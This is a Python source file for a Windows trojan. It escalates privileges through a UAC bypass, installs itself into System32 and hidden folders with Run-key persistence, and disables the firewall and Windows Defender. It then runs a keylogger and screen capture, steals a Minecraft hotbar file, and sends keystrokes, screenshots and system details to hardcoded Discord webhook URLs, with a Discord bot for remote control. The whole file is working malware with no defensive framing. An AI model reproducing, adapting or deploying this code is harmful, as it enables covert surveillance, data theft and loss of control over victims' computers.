from core import keylogger, sender, turn_off_security
from PIL import ImageGrab
from discord_bot import bot
from winpwnage.functions.elevate.elevateMethod1 import elevateMethod1
import time, os, sys, shutil, win32api, win32con, threading

if getattr(sys, 'frozen', False):
	file_path = sys.executable
	type_of = "exe"
elif __file__:
	file_path = __file__
	type_of = "py"

if os.path.dirname(file_path) != 'C:\\Windows\\System32':
	if True:
		elevateMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f"cp {file_path} c:\\windows\\system32\\systemcheck.exe"])
		elevateMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /f /v systemcheck /t REG_SZ /d c:\\windows\\system32\\systemcheck.exe'])

if os.path.dirname(file_path) != "C:\\SysCheck":
	try:
		os.mkdir("C:\\SysCheck")
	except:
		pass
	os.system("attrib +s +h /d C:\\SysCheck")
	file_startup_path = f"C:\\SysCheck\\SysCheck.{'py' if type_of == 'py' else 'exe'}"
	shutil.copy(file_path, file_startup_path)
	key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, key_path, 0, win32con.KEY_ALL_ACCESS)
	win32api.RegSetValueEx(key, "SysCheck", 0, win32con.REG_SZ, file_startup_path)
	win32api.RegCloseKey(key)

Security = turn_off_security.TurnOffSecurity()
keylogger = keylogger.Keylogger()
sender = sender.Sender()

Security.FireWall()
Security.Defender()
keylogger.start()
sender.webhook_log_url = 'https://discord.com/api/webhooks/1128326661000155248/nDG6sPvn8RitbJwHtDpm0Njy9xkOG_ajJBJfX-Hatd0RYuVymvpdD3IAgReuqj4BGam6'
sender.webhook_info_url = 'https://discord.com/api/webhooks/1128643994163871867/B9HL54arPjlrVqR2vAuWCnICe_ngD1k8hMjCxkuIlJhxkZ-cr24gZlgZz5oYZ8sczREJ'
sender.send_info()

last_window = ''
last_window = keylogger.log_window_title if last_window == '' else ''
global time_count, time_delay
time_count = time_delay = 60

def StealHotBar():
	hotbar = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\.minecraft\\hotbar.nbt"
	try:
		sender.send_file(hotbar, '**HotBar Stealer**')
	except:
		sender.send("Not Found HotBar", "HotBar Stealer")
StealHotBar()

def Send():
	last_window = keylogger.log_window_title
	snapshot = ImageGrab.grab()
	image_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\sc.jpg"
	snapshot.save(image_path)
	sender.send(keylogger.log_text, keylogger.log_window_title, image_path)
	keylogger.log_text = ''

def LogSend():
	global time_count, time_delay
	while True:
		Send()
		time.sleep(time_delay)
		if keylogger.log_window_title == last_window:
			time_count -= 1
			time.sleep(1)
			if time_count == 0 and keylogger.log_text != '':
				Send()
				time_count = time_delay
			elif time_count == 0 and keylogger.log_text == '':
				time_count = time_delay
		elif keylogger.log_text != '':
			Send()
			time_count = time_delay

def BotControl():
	bot.client.run('')

log_send = threading.Thread(target = LogSend, daemon=True)
bot_th = threading.Thread(target = BotControl)
log_send.start()
bot_th.start()
log_send.join()
bot_th.join()
